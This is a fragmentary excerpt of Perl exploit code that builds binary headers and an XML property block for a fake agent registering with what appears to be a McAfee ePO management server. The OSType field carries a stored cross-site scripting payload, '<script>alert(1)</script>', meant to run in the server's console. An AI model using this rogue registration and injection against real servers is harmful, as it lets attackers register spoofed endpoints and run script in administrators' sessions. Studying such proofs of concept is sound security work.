...
#============================================================#
# Register Request : Header1                                 #
#============================================================#
sub build_struct_register_header1{
...
#============================================================#
# Register Request : Header2                                 #
#============================================================#
sub build_struct_register_header2{
	...
	my $this = shift;
        ...
        $this->{binary_header2} =
                "\x0e\x00\x00\x00" . "AssignmentList" .         pack("V", length("0")) . "0" .
                "\x0c\x00\x00\x00" . "ComputerName" .           pack("V", length($this->{agent_hostname})) . $this->{agent_hostname} .
                "\x0a\x00\x00\x00" . "DomainName" .             pack("V", length("WORKGROUP")) . "WORKGROUP" .
                "\x12\x00\x00\x00" . "EventFilterVersion" .     pack("V", length("0")) . "0"  .
                ...
                "\x0b\x00\x00\x00" . "PackageType" .            pack("V", length("AgentPubKey")) ."AgentPubKey" .
                "\x0a\x00\x00\x00" . "PlatformID" .             pack("V", length("WXPW:5:1:3")) . "WXPW:5:1:3".
                "\x0d\x00\x00\x00" . "PolicyVersion" .          pack("V", length("0")) . "0".
                "\x0c\x00\x00\x00" . "PropsVersion" .           pack("V", length("20401119214747")) ."20401119214747" .
                "\x12\x00\x00\x00" . "RepoKeyHashVersion" .     pack("V", length("0")) . "0" .
                "\x0e\x00\x00\x00" . "SequenceNumber" .         pack("V", length("1")) . "1" .
                "\x0d\x00\x00\x00" . "ServerKeyHash" .          pack("V", length($this->{server_pubkeyhash})) .$this->{server_pubkeyhash} .
                "\x0f\x00\x00\x00" . "SiteinfoVersion" .        pack("V", length("0")) . "0" .
                "\x15\x00\x00\x00" . "SupportedSPIPEVersion" .  pack("V", length("3.0;4.0;5.0;6.0")) . "3.0;4.0;5.0;6.0".
                "\x0b\x00\x00\x00" . "TaskVersion" .            pack("V", length("0")) . "0".
...
#============================================================#
# Register Request : Full props                              #
#============================================================#
sub build_struct_register_fullprops {
...
<?xml version="1.0" encoding="UTF-8"?>
        ...
        <ComputerProperties>
                ...
                <DefaultLangID>080c</DefaultLangID>
                ...
                <OSType><![CDATA[<script>alert(1)</script>]]>Windows XP</OSType>
